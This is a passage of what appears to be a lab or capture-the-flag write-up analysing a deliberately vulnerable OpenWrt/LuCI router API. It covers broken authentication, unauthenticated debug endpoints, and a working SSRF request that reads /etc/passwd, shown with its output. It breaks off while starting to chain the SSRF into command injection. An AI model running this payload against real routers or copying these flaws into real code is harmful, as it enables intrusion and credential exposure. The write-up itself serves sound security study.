# Introduction
In this section we are analyzing the vulnerabilities present in the internal API of the vulnerable home router. This API is used for administration purposes, and it is accessible from the local network in `http://192.168.2.1:80`.

# API2:2023 Broken Authentication

The authentication mechanism of our API for managing the router detects some key characteristics typical of *inadequate authentication*.

## 1. Vulnerable session management

In the session creation function, there is no rate limiting or protection against brute force attacks:
```lua
local function session_setup(user, pass, allowed_users)

	if util.contains(allowed_users, user) then

		local login = util.ubus("session", "login", {

			username = user,

			password = pass,

			timeout = tonumber(luci.config.sauth.sessiontime)

		})
```

## 2. Weak token generation
```lua
util.ubus("session", "set", {

		ubus_rpc_session = login.ubus_rpc_session,

		values = { token = sys.uniqueid(16) }
})
```

## 3. Insufficient validation

There is no validation of the origin of the CSRF token.

```lua
function test_post_security()

	if http.getenv("REQUEST_METHOD") ~= "POST" then
		http.status(405, "Method Not Allowed")
		http.header("Allow", "POST")
		return false
	end
	
	if http.formvalue("token") ~= context.authtoken then
		http.status(403, "Forbidden")
		luci.template.render("csrftoken")
		return false
	end

	return true
end
```

The session to be returned is also not properly verified:
```lua
local function session_retrieve(sid, allowed_users)

	local sdat = util.ubus("session", "get", { ubus_rpc_session = sid })
	
	  
	
	if type(sdat) == "table" and
		type(sdat.values) == "table" and
		type(sdat.values.token) == "string" and
		(not allowed_users or
		util.contains(allowed_users, sdat.values.username))
	then
		uci:set_session_id(sid)
		return sid, sdat.values
	end
	return nil, nil
end
```

The source IP address is not verified, nor is the token expiration date or the consistency of the User-Agent.

## Lack of current password validation

The code allows the administrator password to be changed **without verifying the current password.** It relies entirely on the authentication that has already been performed to access the administration panel.
```lua
function m.parse(map)
    local v1 = pw1:formvalue("_pass")
    local v2 = pw2:formvalue("_pass")

    if v1 and v2 and #v1 > 0 and #v2 > 0 then
        if v1 == v2 then
            -- VULNERABILIDAD: Cambia la contraseña sin verificar la actual
            if luci.sys.user.setpasswd(luci.dispatcher.context.authuser, v1) == 0 then
                m.message = translate("Password successfully changed!")
            else
                m.message = translate("Unknown Error, password not changed!")
            end
        else
            m.message = translate("Given password confirmation did not match, password not changed!")
        end
    end

    Map.parse(map)
end
```

# API7:2023 Server Side Request Forgery

The developer left a file for debugging and testing the connection to different points in the system to see if URL evaluations and connections within the same network were working. To do this, they used an alternative route outside the path of the parent node `dispatch.lua`, so authentication is not required to use this endpoint.

```lua
function index()
	local api_node = entry({"api"}, firstchild(), _("API"), 10)
	api_node.sysauth = false
	
	local v1_node = entry({"api", "v1"}, firstchild(), _("API v1"), 20)
	v1_node.sysauth = false
	
	local check_node = entry({"api", "v1", "check"}, call("check_service"), _("Network Service Check"), 60)
	check_node.sysauth = false
	
	local ping_node = entry({"api", "v1", "ping"}, call("ping_host"), _("Ping Host"), 61)
	ping_node.sysauth = false
	
	local status_node = entry({"api", "v1", "status"}, call("service_status"), _("Service Status"), 62)
	status_node.sysauth = false
	
	local tools_node = entry({"tools"}, firstchild(), _("Tools"), 30)
	tools_node.sysauth = false
	
	local ping_simple = entry({"tools", "ping"}, call("ping_host"), _("Ping Tool"), 70)
	ping_simple.sysauth = false
	
	local check_simple = entry({"tools", "check"}, call("check_service"), _("Network Check"), 71)
	check_simple.sysauth = false
end
```

Furthermore, if we list the installed tools and packages, we can see that *curl* was left installed during the development phase, most likely to carry out these tests.

Using this entry, we can see that the server receives requests and reports results:

```shell
❯ curl -X GET "http://192.168.1.1/cgi-bin/luci/api/v1/check?url=file:///etc/passwd"
{"vulnerability":"SSRF_WITHOUT_AUTH","requester":"192.168.1.2","timestamp":1750736334,"status":"success","url":"file:\/\/\/etc\/passwd","headers":[],"response":"  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current\n                                 Dload  Upload   Total   Spent    Left  Speed\n\r  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0root:x:0:0:root:\/root:\/bin\/ash\nntp:x:123:123:ntp:\/var\/run\/ntp:\/bin\/false\ndnsmasq:x:453:453:dnsmasq:\/var\/run\/dnsmasq:\/bin\/false\nlogd:x:514:514:logd:\/var\/run\/logd:\/bin\/false\nubus:x:81:81:ubus:\/var\/run\/ubus:\/bin\/false\nnetwork:x:101:101:network:\/var\/run\/network:\/bin\/false\nopenwrtuser:x:1000:1000:root:\/root:\/bin\/ash\nanonymous:x:1001:1001::\/tmp\/ftp:\/bin\/ash\nnobody:x:1002:1002::\/var:\/bin\/false\n\r100   390  100   390    0     0   455k      0 --:--:-- --:--:-- --:--:--  380k\n"}%
```

In this case, it is reported that the user has successfully discovered the vulnerability.
### RCE in Diagnostics

In the *Network* section, there is an entry called *Diagnostics* that allows certain commands to be executed: *ping, traceroute, nslookup.* If we analyze the code responsible for these functionalities, we realize that it has a problem:
```lua
138: page = entry({"admin", "network", "diag_ping"}, call("diag_ping"), nil)
```

In the *network.lua* file, which is where the different functionalities are located, we see that the call to the *diag_ping* function that executes the command uses *call()*, which allows both POST and GET requests. If we analyze a packet sent to the server using this service, we see that we can bypass certain basic authentication fields. Even so, we need the *syauth* cookie to be allowed to use this function. This is where the previously discovered **SSRF** comes into play. If we make a request to the *ping* endpoint using the server itself, we see the following:

